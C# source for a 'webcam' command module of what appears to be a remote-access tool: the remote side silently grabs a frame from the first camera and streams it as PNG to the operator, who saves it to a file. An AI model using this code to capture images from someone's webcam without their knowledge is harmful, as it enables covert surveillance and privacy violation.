using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Timers;
using AForge.Video;
using AForge.Video.DirectShow;
using NetworkManager;
using Shared;
using Timer = System.Timers.Timer;

namespace Commands
{
    internal class Webcam : ICommand
    {
        #region ICommand properties
        public string name { get; } = "webcam";

        public string description { get; } = "Webcam control utility, able to take pictures and record videos";

        public string syntaxHelper { get; } = "webcam [picture|video] [fileToWrite]";

        public bool isLocal { get; } = false;

        public List<List<Type>> validArguments { get; } = new List<List<Type>>()
        {
            new List<Type>(){typeof(string), typeof(string)}
        };

        public List<string> clientFlags { get; } = new List<string>()
        {
            "{Webcam:pic}",
            "{Webcam:video}"
        };

        public List<string> savedData { get; set; } = new List<string>();
        #endregion ICommand properties

        VideoCaptureDevice video { get; set; }

        bool mustReturn { get; set; }


        public CommandsManager.PreProcessResult PreProcessCommand(List<string> args)
        {
            savedData.Add(args[1]);
            return CommandsManager.PreProcessResult.OK;
        }

        public void ClientMethod(List<string> args)
        {
            var fileName = savedData[0];

            var result = GlobalNetworkManager.ReadLine();

            if (result != "OK")
            {
                ColorTools.WriteCommandError("Unable to use the webcam in the default timespan, maybe another application is using it");
                return;
            }

            // Get data length
            var dataLength = int.Parse(GlobalNetworkManager.ReadLine());

            try
            {
                using (var fs = new FileStream(fileName, FileMode.Create))
                {
                    GlobalNetworkManager.ReadNetworkStreamAndWriteToStream(fs, 4096, dataLength);
                }

                ColorTools.WriteCommandSuccess($"Screenshot saved : {fileName}");
            }
            catch (Exception)
            {
                // Delete the partially created file
                File.Delete(fileName);
                ColorTools.WriteCommandError("An error occured");
            }
        }

        public void ServerMethod(List<string> args)
        {
            GlobalNetworkManager.WriteLine(clientFlags[0]);
            mustReturn = false;

            var captureDevice = new FilterInfoCollection(FilterCategory.VideoInputDevice)[0];
            video = new VideoCaptureDevice(captureDevice.MonikerString);
            video.NewFrame += Video_NewFrame;
            video.Start();

            // Leave 3 seconds to get a frame
            var timer = new Timer(3000);
            timer.Elapsed += timer_Elapsed;
            timer.AutoReset = false;
            timer.Enabled = true;

            while (!mustReturn)
            {
                Thread.Sleep(100);
            }
        }

        void Video_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            video.SignalToStop();
            GlobalNetworkManager.WriteLine("OK");

            using (var ms = new MemoryStream())
            {
                eventArgs.Frame.Save(ms, ImageFormat.Png);

                // Send the data length first
                GlobalNetworkManager.WriteLine(ms.Length.ToString());

                // Reset memory stream position
                ms.Position = 0;
                GlobalNetworkManager.ReadStreamAndWriteToNetworkStream(ms, 4096);
            }

            mustReturn = true;
        }

        void timer_Elapsed(object sender, ElapsedEventArgs e)
        {
            // If the video source is still running, no pic was taken
            if (video.IsRunning)
            {
                GlobalNetworkManager.WriteLine("KO");
                mustReturn = true;
            }
        }
    }
}
